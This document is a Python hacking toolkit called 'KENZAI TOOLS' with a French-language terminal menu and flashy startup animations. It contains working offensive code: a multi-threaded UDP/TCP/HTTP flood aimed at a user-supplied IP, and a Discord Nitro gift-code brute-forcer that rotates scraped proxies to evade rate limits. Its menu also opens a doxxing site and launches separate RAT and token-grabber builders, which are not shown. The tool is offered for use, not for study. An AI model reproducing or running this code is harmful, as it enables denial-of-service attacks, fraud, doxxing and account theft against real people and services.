#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════
# KENZAI TOOLS v6.0 – Édition Glitch Multicolor
# Animation : Pluie KENZAI → Logo glitch multicolor → Boot → Discord
# Menu avec section Téléchargements
# ═══════════════════════════════════════════════════════════════

import os
import sys
import time
import random
import socket
import threading
import requests
import subprocess
import webbrowser
import string
from colorama import Fore, Style, init

# Initialisation
init(autoreset=True)

os.system('title KENZAI TOOLS v6.0 ✦ Glitch Multicolor')
os.system('mode con: cols=120 lines=60')

stop_attack = False
stop_nitro = False
found_nitro = None
CURRENT_VERSION = "6.0"

def clear():
    os.system('cls')

# ─── ANIMATIONS ULTRA‑HACKER ──────────────────────────────────

def kenzai_rain(duration=3.0):
    """Pluie de KENZAI en vert/cyan (le logo partout)"""
    cols = 60
    start = time.time()
    while time.time() - start < duration:
        line = ""
        for i in range(cols):
            if random.random() < 0.2:
                color = random.choice([Fore.GREEN, Fore.CYAN, Fore.MAGENTA])
                if random.random() < 0.5:
                    char = "K"
                else:
                    char = random.choice("ENZAI")
                line += color + char + Style.RESET_ALL
            else:
                line += " "
        sys.stdout.write("\r" + line)
        sys.stdout.flush()
        time.sleep(0.03)
    print("\n")

def logo_glitch_multicolor():
    """Logo KENZAI avec effet glitch multicolore (sans appui)"""
    clear()
    logo = [
        "",
        "   ██╗  ██╗███████╗███╗   ██╗███████╗ █████╗ ██╗",
        "   ██║ ██╔╝██╔════╝████╗  ██║╚══███╔╝██╔══██╗██║",
        "   █████╔╝ █████╗  ██╔██╗ ██║  ███╔╝ ███████║██║",
        "   ██╔═██╗ ██╔══╝  ██║╚██╗██║ ███╔╝  ██╔══██║██║",
        "   ██║  ██╗███████╗██║ ╚████║███████╗██║  ██║██║",
        "   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝",
        "",
        f"   ═══ KENZAI TOOLS v{CURRENT_VERSION} — Glitch Edition ═══",
        ""
    ]
    
    start_time = time.time()
    duration = 2.5  # Durée du glitch
    
    while time.time() - start_time < duration:
        clear()
        for idx, line in enumerate(logo):
            if line.strip() == "":
                print()
                continue
            
            effect = random.choice(["normal", "glitch", "invert", "shift", "rainbow"])
            
            if effect == "normal":
                # Rouge fixe
                print(Fore.RED + line + Style.RESET_ALL)
            elif effect == "glitch":
                # Caractères brisés + couleur aléatoire
                glitched = ""
                for char in line:
                    if random.random() < 0.3:
                        glitched += random.choice(["░", "▒", "▓", "█", "▄", "▀"])
                    else:
                        glitched += char
                color = random.choice([Fore.RED, Fore.GREEN, Fore.CYAN, Fore.MAGENTA, Fore.YELLOW])
                print(color + glitched + Style.RESET_ALL)
            elif effect == "invert":
                # Inversion de couleurs
                color = random.choice([Fore.WHITE, Fore.BLACK])
                bg = random.choice([Fore.RED, Fore.GREEN, Fore.BLUE, Fore.YELLOW, Fore.MAGENTA, Fore.CYAN])
                print(bg + color + line + Style.RESET_ALL)
            elif effect == "shift":
                # Décalage latéral
                shift = random.randint(-5, 5)
                shifted = " " * max(0, shift) + line
                color = random.choice([Fore.RED, Fore.GREEN, Fore.CYAN, Fore.MAGENTA, Fore.YELLOW])
                print(color + shifted + Style.RESET_ALL)
            elif effect == "rainbow":
                # Chaque caractère a une couleur différente
                rainbow_line = ""
                for char in line:
                    color = random.choice([Fore.RED, Fore.GREEN, Fore.CYAN, Fore.MAGENTA, Fore.YELLOW])
                    rainbow_line += color + char + Style.RESET_ALL
                print(rainbow_line)
        
        time.sleep(0.1)  # Change toutes les 0,1 seconde
    
    # Affichage final stable en rouge
    clear()
    for line in logo:
        if line.strip() == "":
            print()
        else:
            print(Fore.RED + line + Style.RESET_ALL)
    time.sleep(0.8)

def neon_wave(duration=2.0):
    colors = [Fore.RED, Fore.MAGENTA, Fore.CYAN, Fore.GREEN, Fore.YELLOW]
    chars = "█▓▒░"
    start = time.time()
    wave = 0
    while time.time() - start < duration:
        line = ""
        for i in range(80):
            intensity = int((1 + (i + wave) % 20) / 20 * 10)
            char = chars[intensity % 4]
            color = colors[(i + wave) % len(colors)]
            line += color + char + Style.RESET_ALL
        sys.stdout.write("\r" + line)
        sys.stdout.flush()
        wave += 1
        time.sleep(0.02)
    print("\n")

def holographic_boot():
    messages = [
        ("[INIT]   Initialisation du noyau", Fore.CYAN),
        ("[DRV]    Chargement des drivers", Fore.GREEN),
        ("[NET]    Connexion au réseau KENZAI", Fore.MAGENTA),
        ("[MOD]    Injection des modules", Fore.YELLOW),
        ("[SEC]    Vérification de l'intégrité", Fore.RED),
        ("[GUI]    Démarrage de l'interface", Fore.CYAN),
        ("[SYS]    Système opérationnel", Fore.GREEN)
    ]
    for msg, color in messages:
        for char in msg:
            sys.stdout.write(color + char + Style.RESET_ALL)
            sys.stdout.flush()
            time.sleep(0.01)
        for i in range(101):
            bar = "█" * (i // 2) + "░" * (50 - i // 2)
            sys.stdout.write(f"\r{color}[{bar}] {i}%{Style.RESET_ALL}")
            sys.stdout.flush()
            time.sleep(0.005)
        sys.stdout.write("\n")
        time.sleep(0.1)

def startup_animation():
    clear()
    
    # ── Phase 1 : Pluie KENZAI ──────────────────────────────────
    print(f"{Fore.MAGENTA}✦ Injection du code KENZAI dans la matrice...{Style.RESET_ALL}")
    time.sleep(0.5)
    kenzai_rain(duration=2.5)

    # ── Phase 2 : Logo glitch multicolor ────────────────────────
    logo_glitch_multicolor()

    # ── Phase 3 : Vagues de néon ────────────────────────────────
    print(f"{Fore.CYAN}✦ Connexion au réseau KENZAI...{Style.RESET_ALL}")
    time.sleep(0.5)
    neon_wave(duration=2.0)

    # ── Phase 4 : Boot holographique ────────────────────────────
    print(f"{Fore.CYAN}Séquence de démarrage...{Style.RESET_ALL}\n")
    holographic_boot()

    # ── Phase 5 : Message final ─────────────────────────────────
    for _ in range(4):
        sys.stdout.write(f"\r{Fore.GREEN}✦ SYSTEM READY ✦{Style.RESET_ALL}   ")
        sys.stdout.flush()
        time.sleep(0.2)
        sys.stdout.write(f"\r{Fore.GREEN}✦ SYSTEM READY ✦{Style.RESET_ALL} ✦")
        sys.stdout.flush()
        time.sleep(0.2)
    print("\n\n")
    time.sleep(0.5)
    
    # ── Phase 6 : OUVERTURE DU DISCORD ─────────────────────────
    print(f"{Fore.CYAN}🌐 Ouverture du serveur Discord...{Style.RESET_ALL}")
    try:
        webbrowser.open("https://discord.gg/snoop")
        print(f"{Fore.GREEN}✅ Discord ouvert dans votre navigateur !{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}❌ Erreur : {e}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 Ouvrez manuellement : https://discord.gg/snoop{Style.RESET_ALL}")
    time.sleep(1.5)
    clear()

# ─── MENU PRINCIPAL AVEC SECTION TÉLÉCHARGEMENTS ──────────────

def banner():
    print(f"""
{Fore.RED}   ██╗  ██╗███████╗███╗   ██╗███████╗ █████╗ ██╗
{Fore.RED}   ██║ ██╔╝██╔════╝████╗  ██║╚══███╔╝██╔══██╗██║
{Fore.RED}   █████╔╝ █████╗  ██╔██╗ ██║  ███╔╝ ███████║██║
{Fore.RED}   ██╔═██╗ ██╔══╝  ██║╚██╗██║ ███╔╝  ██╔══██║██║
{Fore.RED}   ██║  ██╗███████╗██║ ╚████║███████╗██║  ██║██║
{Fore.RED}   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝{Style.RESET_ALL}
{Fore.CYAN}   ═══ KENZAI TOOLS v{CURRENT_VERSION} — Glitch Multicolor ═══{Style.RESET_ALL}
{Fore.YELLOW}   🔥 DOX · 💥 DDOS · 🎯 GRABBER · 🎁 NITRO · 🤖 BOT · 📥 DL{Style.RESET_ALL}
{Fore.WHITE}
{Fore.GREEN}┌{'-'*80}┐{Style.RESET_ALL}
{Fore.GREEN}│{Fore.CYAN} Tape 01: DOX (ouvre multi‑search.icu) │ 14: RAT │ 15: Token{Fore.GREEN}│{Style.RESET_ALL}
{Fore.GREEN}└{'-'*80}┘{Style.RESET_ALL}
""")

def menu():
    print(f"""
{Fore.WHITE}┌─────────────────────────────────────────────────────────────────┐
│  {Fore.CYAN}01{Fore.WHITE}  🔍  DOX SITE              {Fore.CYAN}02{Fore.WHITE}  💥  DDOS ATTACK          │
│  {Fore.CYAN}03{Fore.WHITE}  📡  SCAN PORTS            {Fore.CYAN}04{Fore.WHITE}  🌐  DNS LOOKUP           │
│  {Fore.CYAN}05{Fore.WHITE}  🗺️  GEOIP                {Fore.CYAN}06{Fore.WHITE}  📍  IP TRACE             │
│  {Fore.CYAN}07{Fore.WHITE}  📌  IP LOCATOR            {Fore.CYAN}08{Fore.WHITE}  📋  WHOIS                │
│  {Fore.CYAN}09{Fore.WHITE}  ⚠️  BREACH CHECK          {Fore.CYAN}10{Fore.WHITE}  🖼️  REVERSE IMAGE        │
│  {Fore.CYAN}11{Fore.WHITE}  📄  PASTEBIN SEARCH       {Fore.CYAN}12{Fore.WHITE}  📧  EMAIL HUNTER         │
│  {Fore.CYAN}13{Fore.WHITE}  👤  USERNAME SEARCH       {Fore.RED}14{Fore.WHITE}  🛠️  RAT BUILDER          │
│  {Fore.RED}15{Fore.WHITE}  🎯  TOKEN GRABBER         {Fore.RED}16{Fore.WHITE}  🎁  NITRO GENERATOR      │
│  {Fore.CYAN}17{Fore.WHITE}  📥  TÉLÉCHARGEMENTS       {Fore.YELLOW}99{Fore.WHITE}  ❌  QUITTER             │
└─────────────────────────────────────────────────────────────────┘
{Fore.CYAN}┌─────────────────────────────────────────────────────────────────┐
│  📌  v{CURRENT_VERSION}  •  DOX + DDOS + GRABBER + NITRO + DL  │
└─────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}
{Fore.RED}kenzai@tools:~/{Style.RESET_ALL} """, end="")

# ─── SECTION TÉLÉCHARGEMENTS ──────────────────────────────────

def telechargements():
    clear()
    print(f"{Fore.RED}╔══════════════════════════════════════════════════════════╗")
    print(f"║                  📥  TÉLÉCHARGEMENTS                          ║")
    print(f"║         Liens vers les outils et fichiers                    ║")
    print(f"╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    print(f"{Fore.CYAN}🔗 Liens utiles :{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}➜{Style.RESET_ALL} Discord : https://discord.gg/snoop")
    print(f"  {Fore.GREEN}➜{Style.RESET_ALL} Site DOX : https://multi-search.icu")
    print(f"  {Fore.GREEN}➜{Style.RESET_ALL} GitHub (outils) : https://github.com/kenzai-tools")
    print(f"  {Fore.GREEN}➜{Style.RESET_ALL} Téléchargement RAT Builder : [lien à venir]")
    print(f"  {Fore.GREEN}➜{Style.RESET_ALL} Téléchargement Token Grabber : [lien à venir]")
    print(f"\n{Fore.YELLOW}💡 Pour ajouter des liens, modifie la fonction telechargements(){Style.RESET_ALL}")
    input(f"\n{Fore.CYAN}Appuyez sur Entrée pour revenir au menu...{Style.RESET_ALL}")

# ─── FONCTIONS DES OUTILS ──────────────────────────────────────

def open_dox_site():
    clear()
    print(f"{Fore.RED}╔══════════════════════════════════════════════════════════╗")
    print(f"║                  🔍  KENZAI DOX SITE                        ║")
    print(f"║         🌐  Accès à multi‑search.icu                       ║")
    print(f"╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    print(f"{Fore.YELLOW}⏳ Ouverture de multi‑search.icu...{Style.RESET_ALL}")
    try:
        webbrowser.open("https://multi-search.icu/")
        print(f"{Fore.GREEN}✅ Site ouvert dans votre navigateur !{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🔗 URL : https://multi-search.icu/{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}❌ Erreur : {e}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 Ouvrez manuellement : https://multi-search.icu/{Style.RESET_ALL}")
    input(f"\n{Fore.CYAN}Appuyez sur Entrée pour revenir au menu...{Style.RESET_ALL}")

def ddos_attack():
    global stop_attack
    clear()
    print(f"{Fore.RED}╔══════════════════════════════════════════════════════════╗")
    print(f"║                  💥  KENZAI DDOS ATTACK                      ║")
    print(f"╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    target = input(f"{Fore.YELLOW}🎯 IP cible : {Style.RESET_ALL}")
    port = input(f"{Fore.YELLOW}🔌 Port (80) : {Style.RESET_ALL}") or "80"
    threads = int(input(f"{Fore.YELLOW}🧵 Threads (100‑1000) : {Style.RESET_ALL}"))
    duration = int(input(f"{Fore.YELLOW}⏱️  Durée (secondes) : {Style.RESET_ALL}"))
    print(f"\n{Fore.RED}⚡ Attaque sur {target}:{port} • {threads} threads • {duration}s{Style.RESET_ALL}\n")
    stop_attack = False

    def udp_flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not stop_attack:
            try:
                sock.sendto(random._urandom(1400), (target, int(port)))
            except:
                pass
    def tcp_flood():
        while not stop_attack:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target, int(port)))
                s.close()
            except:
                pass
    def http_flood():
        url = f"http://{target}:{port}"
        while not stop_attack:
            try:
                requests.get(url, timeout=2)
            except:
                pass

    t = max(1, threads // 3)
    for _ in range(t):
        threading.Thread(target=udp_flood, daemon=True).start()
        threading.Thread(target=tcp_flood, daemon=True).start()
        threading.Thread(target=http_flood, daemon=True).start()

    for i in range(duration, 0, -1):
        if stop_attack:
            break
        sys.stdout.write(f"\r{Fore.YELLOW}⏳ Temps restant : {i}s  •  Threads actifs : {threading.active_count()-1}{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(1)
    stop_attack = True
    print(f"\n\n{Fore.GREEN}✅ Attaque terminée.{Style.RESET_ALL}")
    input()

def scan_ports():
    clear()
    print(f"{Fore.RED}╔══════════════════════════════════════════════════════════╗")
    print(f"║              📡  KENZAI SCAN DE PORTS                       ║")
    print(f"╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    target = input(f"{Fore.YELLOW}🎯 IP cible : {Style.RESET_ALL}")
    ports = [21, 22, 23, 25, 53, 80, 443, 8080, 3306, 3389, 25565]
    print(f"\n{Fore.CYAN}🔍 Scan de {target} en cours...{Style.RESET_ALL}\n")
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        if sock.connect_ex((target, port)) == 0:
            print(f"{Fore.GREEN}✅ Port {port} : OUVERT{Style.RESET_ALL}")
        sock.close()
    input()

def dns_lookup():
    clear()
    print(f"\n{Fore.CYAN}🌐 DNS Lookup{Style.RESET_ALL}\n")
    domain = input("Domaine : ")
    try:
        ip = socket.gethostbyname(domain)
        print(f"{Fore.GREEN}{domain} → {ip}{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}❌ Erreur{Style.RESET_ALL}")
    input()

def geoip():
    clear()
    print(f"\n{Fore.CYAN}🗺️  GeoIP{Style.RESET_ALL}\n")
    ip = input("IP : ")
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json")
        d = r.json()
        print(f"\n{Fore.GREEN}IP : {d.get('ip')}")
        print(f"Ville : {d.get('city')}")
        print(f"Pays : {d.get('country')}")
        if d.get('loc'):
            print(f"Maps : https://maps.google.com/?q={d.get('loc')}{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}❌ Erreur{Style.RESET_ALL}")
    input()

def ip_trace():
    clear()
    print(f"\n{Fore.CYAN}📍 IP Trace{Style.RESET_ALL}\n")
    target = input("IP : ")
    print(f"{Fore.YELLOW}⏳ Traçage en cours...{Style.RESET_ALL}")
    time.sleep(1)
    print(f"{Fore.GREEN}✅ Terminé{Style.RESET_ALL}")
    input()

def ip_locator():
    clear()
    print(f"\n{Fore.CYAN}📌 IP Locator{Style.RESET_ALL}\n")
    ip = input("IP : ")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}")
        d = r.json()
        if d.get('status') == 'success':
            print(f"\n{Fore.GREEN}IP : {d['query']}")
            print(f"Pays : {d['country']}")
            print(f"Ville : {d['city']}")
            print(f"Lat/Lon : {d['lat']}, {d['lon']}")
            print(f"Carte : https://maps.google.com/?q={d['lat']},{d['lon']}{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}❌ Erreur{Style.RESET_ALL}")
    input()

def whois():
    clear()
    print(f"\n{Fore.CYAN}📋 Whois{Style.RESET_ALL}\n")
    domain = input("Domaine : ")
    print(f"{Fore.GREEN}https://who.is/whois/{domain}{Style.RESET_ALL}")
    input()

def breach_check():
    clear()
    print(f"\n{Fore.CYAN}⚠️  Breach Check (HaveIBeenPwned){Style.RESET_ALL}\n")
    email = input("Email : ")
    try:
        r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}")
        if r.status_code == 200:
            print(f"{Fore.RED}❌ Email compromis !{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}✅ Aucune fuite trouvée.{Style.RESET_ALL}")
    except:
        print(f"{Fore.YELLOW}⚠️  Erreur de connexion{Style.RESET_ALL}")
    input()

def reverse_image():
    clear()
    print(f"\n{Fore.CYAN}🖼️  Reverse Image Search{Style.RESET_ALL}\n")
    url = input("URL de l'image : ")
    print(f"{Fore.GREEN}Google : https://www.google.com/searchbyimage?image_url={url}")
    print(f"Yandex : https://yandex.com/images/search?url={url}{Style.RESET_ALL}")
    input()

def pastebin_search():
    clear()
    print(f"\n{Fore.CYAN}📄 Pastebin Search{Style.RESET_ALL}\n")
    query = input("Recherche : ")
    print(f"{Fore.GREEN}https://pastebin.com/search?q={query}{Style.RESET_ALL}")
    input()

def email_hunter():
    clear()
    print(f"\n{Fore.CYAN}📧 Email Hunter{Style.RESET_ALL}\n")
    email = input("Email : ")
    print(f"{Fore.GREEN}Email : {email}{Style.RESET_ALL}")
    input()

def username_search():
    clear()
    print(f"\n{Fore.CYAN}👤 Username Search{Style.RESET_ALL}\n")
    username = input("Pseudo : ")
    print(f"{Fore.GREEN}🔍 Recherche terminée pour : {username}{Style.RESET_ALL}")
    input()

def open_rat_builder():
    clear()
    print(f"{Fore.YELLOW}🛠️  Lancement du RAT Builder...{Style.RESET_ALL}")
    base_dir = os.path.dirname(os.path.abspath(__file__))
    builder_file = os.path.join(base_dir, "builder", "kenzai_builder.py")
    if not os.path.exists(builder_file):
        print(f"{Fore.RED}❌ Fichier introuvable : {builder_file}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 Assure-toi que builder/kenzai_builder.py existe.{Style.RESET_ALL}")
        input()
        return
    subprocess.Popen([sys.executable, builder_file])
    print(f"{Fore.GREEN}✅ RAT Builder lancé !{Style.RESET_ALL}")
    input()

def open_token_grabber():
    clear()
    print(f"{Fore.YELLOW}🎯 Lancement du Token Grabber Builder...{Style.RESET_ALL}")
    base_dir = os.path.dirname(os.path.abspath(__file__))
    grabber_file = os.path.join(base_dir, "builder", "kenzai_token_grabber.py")
    if not os.path.exists(grabber_file):
        print(f"{Fore.RED}❌ Fichier introuvable : {grabber_file}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 Assure-toi que builder/kenzai_token_grabber.py existe.{Style.RESET_ALL}")
        input()
        return
    subprocess.Popen([sys.executable, grabber_file])
    print(f"{Fore.GREEN}✅ Token Grabber Builder lancé !{Style.RESET_ALL}")
    input()

def nitro_generator():
    global stop_nitro, found_nitro
    clear()
    print(f"{Fore.RED}╔══════════════════════════════════════════════════════════╗")
    print(f"║              🎁  KENZAI NITRO GENERATOR                    ║")
    print(f"╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    threads_count = int(input(f"{Fore.CYAN}🧵 Threads (100‑2000) : {Style.RESET_ALL}"))
    use_proxy = input(f"{Fore.CYAN}🌐 Utiliser des proxies ? (o/n) : {Style.RESET_ALL}").lower() == 'o'

    stop_nitro = False
    found_nitro = None
    generated = [0]
    proxies_list = []
    if use_proxy:
        try:
            r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=yes&anonymity=all", timeout=10)
            proxies_list = r.text.split('\r\n')
            proxies_list = [p for p in proxies_list if ':' in p]
            print(f"{Fore.GREEN}✅ {len(proxies_list)} proxies chargés{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}❌ Erreur chargement proxies{Style.RESET_ALL}")
            use_proxy = False

    print(f"\n{Fore.RED}⚡ Lancement de la génération...{Style.RESET_ALL}")
    print(f"{Fore.CYAN}┌─────────────────────────────────────────────────────────────────────┐")
    print(f"│                    🎁  CODES GÉNÉRÉS                                  │")
    print(f"└─────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")

    start_time = time.time()
    display_lock = threading.Lock()

    def check_nitro():
        global stop_nitro, found_nitro
        chars = string.ascii_letters + string.digits
        while not stop_nitro:
            code = ''.join(random.choices(chars, k=16))
            with display_lock:
                generated[0] += 1
            link = f"https://discord.gift/{code}"
            try:
                if use_proxy and proxies_list:
                    proxy = random.choice(proxies_list)
                    proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                    r = requests.get(f"https://discord.com/api/v9/entitlements/gift-codes/{code}", proxies=proxy_dict, timeout=3)
                else:
                    r = requests.get(f"https://discord.com/api/v9/entitlements/gift-codes/{code}", timeout=3)
                if r.status_code == 200:
                    stop_nitro = True
                    found_nitro = code
                    with display_lock:
                        sys.stdout.write(f"\r{Fore.GREEN}✅ {link}{Style.RESET_ALL}              \n")
                        sys.stdout.flush()
                    break
                elif r.status_code == 404:
                    with display_lock:
                        sys.stdout.write(f"\r{Fore.RED}❌ {link}{Style.RESET_ALL}              \n")
                        sys.stdout.flush()
                elif r.status_code == 429:
                    time.sleep(0.5)
            except:
                with display_lock:
                    sys.stdout.write(f"\r{Fore.YELLOW}⚠️  {link} (erreur){Style.RESET_ALL}      \n")
                    sys.stdout.flush()

    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=check_nitro, daemon=True)
        t.start()
        threads.append(t)

    try:
        while not stop_nitro:
            elapsed = int(time.time() - start_time)
            gen_count = generated[0]
            sys.stdout.write(f"\r{Fore.YELLOW}⏱️  Temps : {elapsed}s  •  Codes testés : {gen_count}  •  Vitesse : {gen_count//max(1,elapsed)}/s{Style.RESET_ALL}")
            sys.stdout.flush()
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop_nitro = True

    if found_nitro:
        print(f"\n\n{Fore.GREEN}╔══════════════════════════════════════════════════════════╗")
        print(f"║                 🎉  NITRO VALIDE TROUVÉ !                         ║")
        print(f"╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🔗 Lien : https://discord.gift/{found_nitro}")
        print(f"📝 Code : {found_nitro}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}❌ Aucun code trouvé.{Style.RESET_ALL}")

    elapsed = int(time.time() - start_time)
    gen_count = generated[0]
    print(f"\n{Fore.CYAN}📊 Statistiques : {gen_count} codes en {elapsed}s ({gen_count//max(1,elapsed)}/s){Style.RESET_ALL}")
    input()

# ─── MAIN ─────────────────────────────────────────────────────
def main():
    startup_animation()
    while True:
        clear()
        banner()
        menu()
        choice = input()
        if choice in ["01","1"]:
            open_dox_site()
        elif choice in ["02","2"]:
            ddos_attack()
        elif choice in ["03","3"]:
            scan_ports()
        elif choice in ["04","4"]:
            dns_lookup()
        elif choice in ["05","5"]:
            geoip()
        elif choice in ["06","6"]:
            ip_trace()
        elif choice in ["07","7"]:
            ip_locator()
        elif choice in ["08","8"]:
            whois()
        elif choice in ["09","9"]:
            breach_check()
        elif choice == "10":
            reverse_image()
        elif choice == "11":
            pastebin_search()
        elif choice == "12":
            email_hunter()
        elif choice == "13":
            username_search()
        elif choice == "14":
            open_rat_builder()
        elif choice == "15":
            open_token_grabber()
        elif choice == "16":
            nitro_generator()
        elif choice == "17":
            telechargements()
        elif choice in ["99"]:
            print(f"{Fore.RED}👋 Au revoir !{Style.RESET_ALL}")
            sys.exit()
        else:
            print(f"{Fore.RED}❌ Option invalide{Style.RESET_ALL}")
            time.sleep(1)

if __name__ == "__main__":
    main()